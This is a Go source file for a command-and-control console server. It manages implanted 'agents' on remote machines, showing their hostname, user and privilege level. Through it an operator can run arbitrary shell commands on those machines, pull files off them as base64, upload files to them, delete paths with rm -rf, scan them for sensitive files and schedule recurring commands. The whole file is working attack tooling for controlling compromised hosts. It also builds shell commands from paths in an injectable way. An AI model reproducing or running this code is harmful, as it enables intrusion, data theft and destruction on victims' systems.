package server

// c2_classic.go — Classic C2 控制台（UI 移植自 github.com/Kxiandaoyan/github-C2
// web-controller）。前端原样内嵌，本文件做 API 适配：把参考前端的 Flask 接口
// 翻译到 goc2（会话=Agent，任务=命令，轮询=SSE 推送）。

import (
	"context"
	"crypto/rand"
	"embed"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"path"
	"regexp"
	"strings"
	"sync"
	"time"
	"unicode/utf8"
)

//go:embed c2classic/index.html
var c2classicIndex []byte

//go:embed c2classic/static
var c2classicStatic embed.FS

// ───────────────────────── SSE hub ─────────────────────────

type classicHub struct {
	mu   sync.Mutex
	subs map[chan []byte]struct{}
}

var c2xHub = &classicHub{subs: map[chan []byte]struct{}{}}

func (h *classicHub) sub() chan []byte {
	ch := make(chan []byte, 64)
	h.mu.Lock()
	h.subs[ch] = struct{}{}
	h.mu.Unlock()
	return ch
}

func (h *classicHub) unsub(ch chan []byte) {
	h.mu.Lock()
	delete(h.subs, ch)
	h.mu.Unlock()
}

func (h *classicHub) publish(event string, data any) {
	b, err := json.Marshal(data)
	if err != nil {
		return
	}
	msg := []byte("event: " + event + "\ndata: " + string(b) + "\n\n")
	h.mu.Lock()
	defer h.mu.Unlock()
	for ch := range h.subs {
		select {
		case ch <- msg:
		default: // 慢消费者丢帧（终端有 messages 兜底拉取）
		}
	}
}

// ───────────────────────── 状态缓存 ─────────────────────────

type classicEntry struct {
	Name  string `json:"name"`
	IsDir bool   `json:"is_dir"`
	Size  int64  `json:"size"`
}

type classicSnap struct {
	ID          int64  `json:"id"`
	Content     string `json:"content"`
	CollectedAt string `json:"collected_at"`
}

var c2x = struct {
	mu        sync.Mutex
	files     map[string]map[string][]classicEntry
	sysinfo   map[string]classicSnap
	sensitive map[string]classicSnap
	siSeq     map[string][]classicSnap
	seSeq     map[string][]classicSnap
	seen      map[string]map[string]bool
	lastAgent string
	pollerOn  bool
}{
	files:     map[string]map[string][]classicEntry{},
	sysinfo:   map[string]classicSnap{},
	sensitive: map[string]classicSnap{},
	siSeq:     map[string][]classicSnap{},
	seSeq:     map[string][]classicSnap{},
	seen:      map[string]map[string]bool{},
}

func c2xRandID() string {
	b := make([]byte, 8)
	rand.Read(b)
	return "cl_" + hex.EncodeToString(b)
}

// ───────────────────────── 轮询器（SSE 数据源） ─────────────────────────

func (s *Server) c2xPollerStart() {
	c2x.mu.Lock()
	if c2x.pollerOn {
		c2x.mu.Unlock()
		return
	}
	c2x.pollerOn = true
	c2x.mu.Unlock()
	go func() {
		tk := time.NewTicker(2 * time.Second)
		defer tk.Stop()
		first := true
		for range tk.C {
			s.c2xPollOnce(first)
			first = false
		}
	}()
}

func (s *Server) c2xPollOnce(first bool) {
	ctx, cancel := context.WithTimeout(context.Background(), 6*time.Second)
	defer cancel()
	clients, err := c2Client().ListClients(ctx, nil)
	if err != nil {
		return
	}
	agents := c2xAgentShape(clients)
	if aj, e := json.Marshal(agents); e == nil && string(aj) != c2x.lastAgent {
		c2x.lastAgent = string(aj)
		if !first {
			c2xHub.publish("agents_updated", map[string]any{"agents": agents})
		}
	}
	for _, c := range clients {
		m, ok := c.(map[string]any)
		if !ok {
			continue
		}
		id, _ := m["id"].(string)
		if id == "" {
			continue
		}
		tasks, err := c2Client().ListTasks(ctx, id, nil)
		if err != nil {
			continue
		}
		c2x.mu.Lock()
		if c2x.seen[id] == nil {
			c2x.seen[id] = map[string]bool{}
		}
		seen := c2x.seen[id]
		c2x.mu.Unlock()
		for _, t := range tasks {
			tm, ok := t.(map[string]any)
			if !ok {
				continue
			}
			tid, _ := tm["id"].(string)
			if tid == "" || seen[tid] {
				continue
			}
			status, _ := tm["status"].(string)
			if status != "done" && status != "failed" {
				continue // 未完成不标记 seen——完成后才推（否则 queued 期被标 seen 永不推送）
			}
			seen[tid] = true
			if first {
				continue // 首帧历史任务不推送（messages 接口兜底拉取）
			}
			typ, _ := tm["type"].(string)
			args, _ := tm["args"].(map[string]any)
			out, _ := tm["output"].(string)
			errs, _ := tm["error"].(string)
			createdAt, _ := tm["createdAt"].(string)
			switch typ {
			case "download":
				p, _ := args["path"].(string)
				size := int64(len(out)) * 3 / 4
				c2xHub.publish("file_downloaded", map[string]any{
					"agent_id": id, "filename": path.Base(p), "size": size, "method": "direct",
				})
			case "upload":
				// 上传完成无终端输出
			default:
				if errs != "" {
					out = "[ERROR] " + errs
				}
				c2xHub.publish("response", map[string]any{
					"agent_id": id, "response_to": tid, "content": out, "timestamp": createdAt,
				})
			}
		}
	}
}

// c2xAgentShape goc2 clients → 参考前端 Agent 卡片形状。
func c2xAgentShape(clients []any) []map[string]any {
	out := []map[string]any{}
	now := time.Now()
	for _, c := range clients {
		m, ok := c.(map[string]any)
		if !ok {
			continue
		}
		id, _ := m["id"].(string)
		if id == "" {
			continue
		}
		lastBeacon, _ := m["lastBeacon"].(string)
		var ago any
		if ts, err := time.Parse(time.RFC3339Nano, lastBeacon); err == nil {
			v := int(now.Sub(ts).Seconds())
			if v < 0 {
				v = 0
			}
			ago = v
		}
		priv, _ := m["privilege"].(string)
		if priv == "" {
			priv = "user"
		}
		hostname, _ := m["hostname"].(string)
		user, _ := m["username"].(string)
		osType, _ := m["osType"].(string)
		arch, _ := m["arch"].(string)
		note, _ := m["notes"].(string)
		out = append(out, map[string]any{
			"id": id, "hostname": hostname, "username": user, "os": osType,
			"arch": arch, "privilege": priv, "note": note,
			"repo": "FORANG", "channel": "worker", "version": "goc2",
			"last_seen": lastBeacon, "last_reply_ago": ago,
		})
	}
	return out
}

// ───────────────────────── 静态资源 + SSE ─────────────────────────

func (s *Server) c2classicPage(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Write(c2classicIndex)
}

func (s *Server) c2classicStatic(w http.ResponseWriter, r *http.Request) {
	p := r.PathValue("p")
	if p == "" || strings.Contains(p, "..") {
		http.NotFound(w, r)
		return
	}
	b, err := c2classicStatic.ReadFile("c2classic/static/" + p)
	if err != nil {
		http.NotFound(w, r)
		return
	}
	switch {
	case strings.HasSuffix(p, ".css"):
		w.Header().Set("Content-Type", "text/css; charset=utf-8")
	case strings.HasSuffix(p, ".js"):
		w.Header().Set("Content-Type", "application/javascript; charset=utf-8")
	}
	w.Write(b)
}

func (s *Server) c2classicStream(w http.ResponseWriter, r *http.Request) {
	// EventSource 无法带 header：?token= 直传 JWT（同源 iframe，泄露面等价 cookie）
	tok := r.URL.Query().Get("token")
	if tok == "" || s.tokenRejectedByToken(tok) {
		writeErr(w, 401, "token 无效")
		return
	}
	fl, ok := w.(http.Flusher)
	if !ok {
		writeErr(w, 500, "streaming unsupported")
		return
	}
	s.c2xPollerStart()
	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Write([]byte(": connected\n\n"))
	fl.Flush()
	ch := c2xHub.sub()
	defer c2xHub.unsub(ch)
	heartbeat := time.NewTicker(15 * time.Second)
	defer heartbeat.Stop()
	for {
		select {
		case msg := <-ch:
			if _, err := w.Write(msg); err != nil {
				return
			}
			fl.Flush()
		case <-heartbeat.C:
			if _, err := w.Write([]byte(": hb\n\n")); err != nil {
				return
			}
			fl.Flush()
		case <-r.Context().Done():
			return
		}
	}
}

// tokenRejectedByToken 校验查询串里的 JWT。
func (s *Server) tokenRejectedByToken(tok string) bool {
	t, ok := verifyJWTToken(tok, s.jwtKey)
	return !ok || s.tokenRejected(t)
}

// ───────────────────────── 适配 API ─────────────────────────

func (s *Server) c2xAgents(w http.ResponseWriter, r *http.Request) {
	clients, err := c2Client().ListClients(r.Context(), nil)
	if err != nil {
		writeErr(w, 502, "goc2 不可达: "+err.Error())
		return
	}
	s.c2xPollerStart()
	writeJSON(w, 200, map[string]any{"agents": c2xAgentShape(clients), "warnings": []string{}})
}

func (s *Server) c2xAgentNote(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	if id == "" {
		writeErr(w, 400, "bad id")
		return
	}
	if r.Method == "GET" {
		clients, _ := c2Client().ListClients(r.Context(), nil)
		for _, c := range clients {
			if m, ok := c.(map[string]any); ok {
				if cid, _ := m["id"].(string); cid == id {
					note, _ := m["notes"].(string)
					writeJSON(w, 200, map[string]any{"note": note})
					return
				}
			}
		}
		writeJSON(w, 200, map[string]any{"note": ""})
		return
	}
	var b struct {
		Note string `json:"note"`
	}
	if err := json.NewDecoder(r.Body).Decode(&b); err != nil {
		writeErr(w, 400, "bad json")
		return
	}
	if err := c2Client().UpdateNotes(r.Context(), id, truncateStr(b.Note, 500)); err != nil {
		writeErr(w, 502, "更新失败: "+err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"ok": true})
}

// c2xCommand 参考前端 /api/command：文件类/采集类命令同步拦截，其余入 goc2 队列。
func (s *Server) c2xCommand(w http.ResponseWriter, r *http.Request) {
	var b struct {
		AgentID string `json:"agent_id"`
		Command string `json:"command"`
	}
	if err := json.NewDecoder(r.Body).Decode(&b); err != nil || b.AgentID == "" || strings.TrimSpace(b.Command) == "" {
		writeErr(w, 400, "agent_id and command required")
		return
	}
	s.c2xPollerStart()
	cmd := strings.TrimSpace(b.Command)
	isWin := s.c2IsWin(r.Context(), b.AgentID)

	switch {
	case cmd == "ls" || cmd == "dir" || strings.HasPrefix(cmd, "ls ") || strings.HasPrefix(cmd, "dir "):
		s.c2xFileListCmd(w, r, b.AgentID, cmd, isWin)
		return
	case strings.HasPrefix(cmd, "readfile "):
		s.c2xFilePreview(w, r, b.AgentID, strings.TrimSpace(strings.TrimPrefix(cmd, "readfile ")), isWin)
		return
	case strings.HasPrefix(cmd, "upload "):
		p := strings.Trim(strings.TrimSpace(strings.TrimPrefix(cmd, "upload ")), "\"")
		tid, err := c2Client().EnqueueTask(r.Context(), b.AgentID, "download", map[string]any{"path": p})
		if err != nil {
			writeErr(w, 502, "download 任务下发失败: "+err.Error())
			return
		}
		writeJSON(w, 200, map[string]any{"command_id": tid, "command": cmd})
		return
	case strings.HasPrefix(cmd, "rm "):
		s.c2xFileDelete(w, r, b.AgentID, cmd, isWin)
		return
	case cmd == "sysinfo":
		s.c2xCollect(w, r, b.AgentID, "sysinfo", isWin)
		return
	case cmd == "sensitive":
		s.c2xCollect(w, r, b.AgentID, "sensitive", isWin)
		return
	case strings.HasPrefix(cmd, "schedule "):
		s.c2xScheduleCmd(w, r, b.AgentID, cmd, isWin)
		return
	}

	cmd = strings.TrimPrefix(cmd, "interactive:")
	tid, err := c2Client().EnqueueTask(r.Context(), b.AgentID, "exec", map[string]any{"cmd": cmd})
	if err != nil {
		writeErr(w, 502, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"command_id": tid, "command": cmd})
}

// c2xFileListCmd ls/dir → 目录列表（缓存 + file_list 事件）。
func (s *Server) c2xFileListCmd(w http.ResponseWriter, r *http.Request, agent, cmd string, isWin bool) {
	p := strings.TrimSpace(strings.TrimPrefix(strings.TrimPrefix(cmd, "ls"), "dir"))
	if p == "" {
		if isWin {
			p = "C:\\Users\\Public"
		} else {
			p = "/root"
		}
	}
	p = strings.Trim(p, "\"")
	var execCmd string
	if isWin {
		execCmd = "dir /A \"" + p + "\""
	} else {
		execCmd = "ls -la \"" + p + "\""
	}
	out, err := s.c2ExecAndWait(r, agent, execCmd)
	entries := []classicEntry{}
	if err == nil {
		entries = c2xParseEntries(out, isWin)
	}
	c2x.mu.Lock()
	if c2x.files[agent] == nil {
		c2x.files[agent] = map[string][]classicEntry{}
	}
	c2x.files[agent][p] = entries
	c2x.mu.Unlock()
	c2xHub.publish("file_list", map[string]any{"agent_id": agent, "path": p, "entries": entries})
	writeJSON(w, 200, map[string]any{"command_id": c2xRandID(), "command": cmd})
}

// c2xFilePreview readfile → 预览载荷（text 走 content，二进制走 b64，≤96KB）。
func (s *Server) c2xFilePreview(w http.ResponseWriter, r *http.Request, agent, p string, isWin bool) {
	var execCmd string
	if isWin {
		execCmd = psOneLiner("$b=[IO.File]::ReadAllBytes('" + strings.ReplaceAll(p, "'", "''") + "'); if($b.Length -gt 98304){Write-Output 'TOO_LARGE'} else {[Convert]::ToBase64String($b)}")
	} else {
		execCmd = "if [ $(stat -c%s \"" + p + "\") -gt 98304 ]; then echo TOO_LARGE; else base64 -w0 \"" + p + "\"; fi"
	}
	out, err := s.c2ExecAndWait(r, agent, execCmd)
	payload := map[string]any{"path": p}
	switch {
	case err != nil:
		payload["content"] = "[预览失败] " + err.Error()
	case strings.TrimSpace(out) == "TOO_LARGE":
		payload["content"] = "[FILE_PREVIEW_NOTICE] too large (>96KB)"
	default:
		if raw, e := base64.StdEncoding.DecodeString(strings.TrimSpace(out)); e == nil {
			payload["size"] = len(raw)
			if utf8.Valid(raw) {
				payload["content"] = string(raw)
			} else {
				payload["b64"] = base64.StdEncoding.EncodeToString(raw)
			}
		} else {
			payload["content"] = "[预览失败] base64 解码失败：" + truncateStr(out, 80)
		}
	}
	c2xHub.publish("file_preview", map[string]any{"agent_id": agent, "data": mustJSON(payload)})
	writeJSON(w, 200, map[string]any{"command_id": c2xRandID(), "command": "readfile " + p})
}

// c2xFileDelete rm → OS 感知删除。
func (s *Server) c2xFileDelete(w http.ResponseWriter, r *http.Request, agent, cmd string, isWin bool) {
	p := strings.Trim(strings.TrimSpace(strings.TrimPrefix(cmd, "rm ")), "\"")
	p = strings.TrimPrefix(strings.TrimPrefix(p, "-f "), "-rf ")
	var execCmd string
	if isWin {
		execCmd = "del /F /Q \"" + p + "\" 2>nul || rmdir /S /Q \"" + p + "\""
	} else {
		execCmd = "rm -rf \"" + p + "\""
	}
	out, err := s.c2ExecAndWait(r, agent, execCmd)
	msg := "deleted: " + p
	if err != nil {
		msg = "[删除失败] " + err.Error()
	} else if strings.TrimSpace(out) != "" {
		msg = out
	}
	c2xHub.publish("response", map[string]any{"agent_id": agent, "response_to": "", "content": msg, "timestamp": time.Now().Format(time.RFC3339)})
	writeJSON(w, 200, map[string]any{"command_id": c2xRandID(), "command": cmd})
}

// c2xScheduleCmd schedule add/ls/rm/clear → FORANG c2ScheduleCmd。
func (s *Server) c2xScheduleCmd(w http.ResponseWriter, r *http.Request, agent, cmd string, isWin bool) {
	fields := strings.Fields(cmd)
	verb := ""
	if len(fields) >= 2 {
		verb = fields[1]
	}
	var secs int
	var sub string
	var jobID int
	switch verb {
	case "add":
		if len(fields) >= 4 {
			fmt.Sscanf(fields[2], "%d", &secs)
			sub = strings.Join(fields[3:], " ")
		}
	case "rm":
		if len(fields) >= 3 {
			fmt.Sscanf(fields[2], "%d", &jobID)
		}
	case "ls", "clear":
	default:
		writeErr(w, 400, "schedule add <secs> <cmd> / ls / rm <id> / clear")
		return
	}
	if verb == "add" && (secs < 10 || sub == "") {
		writeErr(w, 400, "间隔须 ≥10 秒且命令非空")
		return
	}
	execCmd := c2ScheduleCmd(isWin, verb, secs, sub, jobID)
	out, err := s.c2ExecAndWait(r, agent, execCmd)
	content := out
	if err != nil {
		content = "[schedule 失败] " + err.Error()
	}
	c2xHub.publish("response", map[string]any{
		"agent_id": agent, "response_to": "", "content": content,
		"timestamp": time.Now().Format(time.RFC3339),
	})
	writeJSON(w, 200, map[string]any{"command_id": c2xRandID(), "command": cmd})
}

// c2xCollect sysinfo/sensitive 采集（同步，缓存 + 事件）。
func (s *Server) c2xCollect(w http.ResponseWriter, r *http.Request, agent, kind string, isWin bool) {
	var cmds []string
	if kind == "sysinfo" {
		cmds = c2SysinfoCmds(isWin)
	} else {
		cmds = c2SensitiveCmds(isWin)
	}
	var sb strings.Builder
	if kind == "sysinfo" {
		sb.WriteString("===== 系统信息快照 =====\n\n")
	} else {
		sb.WriteString("===== 敏感文件扫描 =====\n\n")
	}
	for _, c := range cmds {
		out, err := s.c2ExecAndWait(r, agent, c)
		if err != nil {
			if kind == "sysinfo" {
				sb.WriteString(fmt.Sprintf("--- %s ---\n[错误] %s\n\n", c, err.Error()))
			}
			continue
		}
		if strings.TrimSpace(out) != "" {
			sb.WriteString(fmt.Sprintf("--- %s ---\n%s\n\n", c, out))
		}
	}
	snap := classicSnap{
		ID:          time.Now().Unix(),
		Content:     sb.String(),
		CollectedAt: time.Now().Format(time.RFC3339),
	}
	c2x.mu.Lock()
	if kind == "sysinfo" {
		c2x.sysinfo[agent] = snap
		c2x.siSeq[agent] = append([]classicSnap{snap}, c2x.siSeq[agent]...)
		if len(c2x.siSeq[agent]) > 10 {
			c2x.siSeq[agent] = c2x.siSeq[agent][:10]
		}
	} else {
		c2x.sensitive[agent] = snap
		c2x.seSeq[agent] = append([]classicSnap{snap}, c2x.seSeq[agent]...)
		if len(c2x.seSeq[agent]) > 10 {
			c2x.seSeq[agent] = c2x.seSeq[agent][:10]
		}
	}
	c2x.mu.Unlock()
	c2xHub.publish(kind, map[string]any{
		"agent_id": agent, "content": snap.Content, "collected_at": snap.CollectedAt, "id": snap.ID,
	})
	s.c2Audit(agent, "", kind+"_collect", "classic")
	writeJSON(w, 200, map[string]any{"command_id": c2xRandID(), "command": kind})
}

func (s *Server) c2xMessages(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	tasks, err := c2Client().ListTasks(r.Context(), id, nil)
	if err != nil {
		writeErr(w, 502, err.Error())
		return
	}
	msgs := []map[string]any{}
	cmdHist := map[string]string{}
	for _, t := range tasks {
		tm, ok := t.(map[string]any)
		if !ok {
			continue
		}
		tid, _ := tm["id"].(string)
		typ, _ := tm["type"].(string)
		if typ != "exec" {
			continue
		}
		args, _ := tm["args"].(map[string]any)
		created, _ := tm["createdAt"].(string)
		out, _ := tm["output"].(string)
		errs, _ := tm["error"].(string)
		cmdStr, _ := args["cmd"].(string)
		if cmdStr == "" {
			continue
		}
		cmdHist[tid] = cmdStr
		msgs = append(msgs, map[string]any{
			"is_command": true, "content": cmdStr, "command_id": tid, "timestamp": created,
		})
		if out != "" || errs != "" {
			msgs = append(msgs, map[string]any{
				"is_command": false, "content": out, "response_to": tid, "timestamp": created,
			})
		}
	}
	writeJSON(w, 200, map[string]any{"messages": msgs, "command_history": cmdHist})
}

func (s *Server) c2xHistoryClear(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, 200, map[string]any{"ok": true, "cleared": []string{}, "warnings": []string{}})
}

func (s *Server) c2xFilesGet(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	p := r.URL.Query().Get("path")
	if p == "" {
		p = "/root"
	}
	c2x.mu.Lock()
	var entries []classicEntry
	if m := c2x.files[id]; m != nil {
		if es, ok := m[p]; ok {
			entries = es
		}
	}
	c2x.mu.Unlock()
	if entries == nil {
		entries = []classicEntry{}
	}
	writeJSON(w, 200, map[string]any{"path": p, "entries": entries})
}

func (s *Server) c2xFilesUpload(w http.ResponseWriter, r *http.Request) {
	if err := r.ParseMultipartForm(64 << 20); err != nil {
		writeErr(w, 400, "multipart: "+err.Error())
		return
	}
	agent := r.FormValue("agent_id")
	dest := r.FormValue("dest_path")
	if dest == "" {
		dest = r.FormValue("dest_dir")
	}
	f, hdr, err := r.FormFile("file")
	if err != nil || agent == "" {
		writeErr(w, 400, "Missing file or agent_id")
		return
	}
	defer f.Close()
	data, err := io.ReadAll(io.LimitReader(f, 48<<20))
	if err != nil {
		writeErr(w, 500, "read: "+err.Error())
		return
	}
	dest = strings.TrimRight(strings.ReplaceAll(dest, "\\", "/"), "/")
	full := dest + "/" + hdr.Filename
	const chunk = 256 * 1024
	total := (len(data) + chunk - 1) / chunk
	for i := 0; i < total; i++ {
		end := (i + 1) * chunk
		if end > len(data) {
			end = len(data)
		}
		arg := map[string]any{"path": full, "data": base64.StdEncoding.EncodeToString(data[i*chunk:end])}
		if _, err := c2Client().EnqueueTask(r.Context(), agent, "upload", arg); err != nil {
			writeErr(w, 502, fmt.Sprintf("chunk %d 失败: %v", i, err))
			return
		}
	}
	s.c2Audit(agent, "", "file_to_agent", fmt.Sprintf("%s → %s (%d chunks)", hdr.Filename, full, total))
	writeJSON(w, 200, map[string]any{"ok": true, "total": total, "filename": hdr.Filename})
}

func (s *Server) c2xSysinfo(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	sid := r.PathValue("sid")
	c2x.mu.Lock()
	defer c2x.mu.Unlock()
	if sid != "" {
		for _, sn := range c2x.siSeq[id] {
			if fmt.Sprint(sn.ID) == sid {
				writeJSON(w, 200, map[string]any{"content": sn.Content})
				return
			}
		}
		writeJSON(w, 200, map[string]any{"content": ""})
		return
	}
	writeJSON(w, 200, map[string]any{"latest": c2x.sysinfo[id], "history": c2x.siSeq[id]})
}

func (s *Server) c2xSensitive(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	sid := r.PathValue("sid")
	c2x.mu.Lock()
	defer c2x.mu.Unlock()
	if sid != "" {
		for _, sn := range c2x.seSeq[id] {
			if fmt.Sprint(sn.ID) == sid {
				writeJSON(w, 200, map[string]any{"content": sn.Content})
				return
			}
		}
		writeJSON(w, 200, map[string]any{"content": ""})
		return
	}
	writeJSON(w, 200, map[string]any{"latest": c2x.sensitive[id], "history": c2x.seSeq[id]})
}

func (s *Server) c2xStats(w http.ResponseWriter, r *http.Request) {
	clients, err := c2Client().ListClients(r.Context(), nil)
	if err != nil {
		writeErr(w, 502, err.Error())
		return
	}
	total, online, idle, offline := 0, 0, 0, 0
	for _, c := range clients {
		if m, ok := c.(map[string]any); ok {
			total++
			switch m["status"] {
			case "active":
				online++
			case "idle":
				idle++
			default:
				offline++
			}
		}
	}
	var n24 int
	_ = s.m.PG().QueryRow(`SELECT count(*) FROM c2_audit WHERE created_at > now() - interval '24 hours'`).Scan(&n24)
	writeJSON(w, 200, map[string]any{
		"agents_total": total, "agents_online": online, "agents_idle": idle, "agents_offline": offline,
		"msgs_24h": n24, "cmds_24h": n24,
	})
}

func (s *Server) c2xAudit(w http.ResponseWriter, r *http.Request) {
	rows, err := s.m.PG().Query(`SELECT id, COALESCE(session_id,''), COALESCE(action,''), COALESCE(detail,''), created_at
		FROM c2_audit ORDER BY id DESC LIMIT 200`)
	if err != nil {
		writeJSON(w, 200, map[string]any{"entries": []any{}})
		return
	}
	defer rows.Close()
	out := []map[string]any{}
	for rows.Next() {
		var id int64
		var sid, action, detail string
		var ts time.Time
		if err := rows.Scan(&id, &sid, &action, &detail, &ts); err != nil {
			continue
		}
		out = append(out, map[string]any{
			"ts": ts.Format("01-02 15:04:05"), "operator": "forang",
			"action": action, "agent_id": sid, "detail": detail,
		})
	}
	writeJSON(w, 200, map[string]any{"entries": out})
}

func (s *Server) c2xVersion(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, 200, map[string]any{"version": "forang-classic-1.0", "channel": "goc2"})
}

func (s *Server) c2xSettings(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		writeJSON(w, 200, map[string]any{"ok": true})
		return
	}
	writeJSON(w, 200, map[string]any{
		"password_set": true, "poll_interval": 30, "issue_limit": 50,
		"web_username": "forang", "always_poll": false,
		"worker_urls": "(goc2 内置)", "github_token": "", "notion_token": "",
	})
}

func (s *Server) c2xStubOK(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, 200, map[string]any{"ok": true})
}

// ───────────────────────── 目录列表解析（Go 版 parseLs/parseDirWin） ─────────────────────────

var (
	winDirRe = regexp.MustCompile(`^(\d{4}[/-]\d{2}[/-]\d{2}\s+\d{2}:\d{2}(?:\s*[AP]M)?|\d{1,2}[/-]\d{1,2}[/-]\d{4}\s+\d{1,2}:\d{2}\s*[AP]M)\s+(<DIR>|<JUNCTION>|<SYMLINKD>|[\d,\.]+)\s+(.+)$`)
	lsRe     = regexp.MustCompile(`^([\-dlbcps][rwxst\-]{9,})\s+\d+\s+\S+\s+\S+\s+(\d+)\s+(\S+\s+\S+\s+[\d:]+|\d+月\d+日\s+[\d:]+|\d{4}-\d{2}-\d{2}\s+[\d:]+)\s+(.+)$`)
)

// parseWinSize "6,868,480" → int64。
func parseWinSize(s string) int64 {
	var n int64
	for _, c := range s {
		if c >= '0' && c <= '9' {
			n = n*10 + int64(c-'0')
		}
	}
	return n
}

func c2xParseEntries(out string, isWin bool) []classicEntry {
	lines := strings.Split(out, "\n")
	entries := []classicEntry{}
	for _, ln := range lines {
		cl := strings.TrimSpace(strings.TrimRight(ln, "\r"))
		if cl == "" {
			continue
		}
		if isWin {
			m := winDirRe.FindStringSubmatch(cl)
			if m == nil {
				continue
			}
			name := strings.TrimSpace(m[3])
			if name == "" || name == "." {
				continue
			}
			isDir := strings.HasPrefix(m[2], "<")
			var size int64
			if !isDir {
				size = parseWinSize(m[2])
			}
			entries = append(entries, classicEntry{Name: name, IsDir: isDir || name == "..", Size: size})
			continue
		}
		if strings.HasPrefix(cl, "total") {
			continue
		}
		m := lsRe.FindStringSubmatch(cl)
		if m == nil {
			continue
		}
		name := strings.SplitN(strings.TrimSpace(m[4]), " -> ", 2)[0]
		if name == "." {
			continue
		}
		var size int64
		fmt.Sscanf(m[2], "%d", &size)
		entries = append(entries, classicEntry{Name: name, IsDir: strings.HasPrefix(m[1], "d") || name == "..", Size: size})
	}
	return entries
}

// ───────────────────────── 路由注册 ─────────────────────────

func (s *Server) registerC2ClassicRoutes(mux *http.ServeMux) {
	mux.HandleFunc("GET /api/tools/c2/classic/page", s.c2classicPage)
	mux.HandleFunc("GET /api/tools/c2/classic/static/{p...}", s.c2classicStatic)
	mux.HandleFunc("GET /api/tools/c2/classic/stream", s.c2classicStream)

	mux.HandleFunc("GET /api/tools/c2/classic/agents", s.c2xAgents)
	mux.HandleFunc("POST /api/tools/c2/classic/agents/refresh", s.c2xAgents)
	mux.HandleFunc("GET /api/tools/c2/classic/agents/{id}/note", s.c2xAgentNote)
	mux.HandleFunc("POST /api/tools/c2/classic/agents/{id}/note", s.c2xAgentNote)
	mux.HandleFunc("POST /api/tools/c2/classic/command", s.c2xCommand)
	mux.HandleFunc("GET /api/tools/c2/classic/messages/{id}", s.c2xMessages)
	mux.HandleFunc("POST /api/tools/c2/classic/history/clear", s.c2xHistoryClear)
	mux.HandleFunc("GET /api/tools/c2/classic/files/{id}", s.c2xFilesGet)
	mux.HandleFunc("POST /api/tools/c2/classic/files/upload", s.c2xFilesUpload)
	mux.HandleFunc("POST /api/tools/c2/classic/files/sendit", s.c2xStubOK)
	mux.HandleFunc("GET /api/tools/c2/classic/sysinfo/{id}", s.c2xSysinfo)
	mux.HandleFunc("GET /api/tools/c2/classic/sysinfo/{id}/{sid}", s.c2xSysinfo)
	mux.HandleFunc("GET /api/tools/c2/classic/sensitive/{id}", s.c2xSensitive)
	mux.HandleFunc("GET /api/tools/c2/classic/sensitive/{id}/{sid}", s.c2xSensitive)
	mux.HandleFunc("GET /api/tools/c2/classic/stats", s.c2xStats)
	mux.HandleFunc("GET /api/tools/c2/classic/audit", s.c2xAudit)
	mux.HandleFunc("GET /api/tools/c2/classic/version", s.c2xVersion)
	mux.HandleFunc("GET /api/tools/c2/classic/settings", s.c2xSettings)
	mux.HandleFunc("POST /api/tools/c2/classic/settings", s.c2xSettings)
	mux.HandleFunc("POST /api/tools/c2/classic/issues/cleanup", s.c2xStubOK)
	mux.HandleFunc("GET /api/tools/c2/classic/backup", s.c2xStubOK)
}

func mustJSON(v any) json.RawMessage {
	b, _ := json.Marshal(v)
	return b
}
